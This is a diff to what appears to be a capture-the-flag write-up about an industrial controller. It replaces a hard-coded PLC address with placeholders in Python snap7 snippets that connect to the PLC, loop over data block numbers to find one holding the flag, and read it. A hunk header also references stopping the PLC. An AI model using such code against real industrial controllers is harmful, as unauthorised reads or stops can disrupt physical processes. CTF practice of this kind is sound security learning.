@@ -34,7 +34,7 @@ client.plc_stop()
 ````python3
 import snap7
 client = snap7.client.Client()
-client.connect("51.75.241.106", 0, 2, 33244)
+client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
 
 #guess the data block number in memory
 for i in range(5000):
@@ -51,8 +51,8 @@ client.disconnect()
 ````python3
 import snap7
 client = snap7.client.Client()
-client.connect("51.75.241.106", 0, 2, 33244)
-dbn, size = 6485, 200
+client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
+dbn, size = 6485, 200 #220 => enough to read the flag
 buffer = client.db_read(dbn, 0, size)
 print(buffer)
 ````
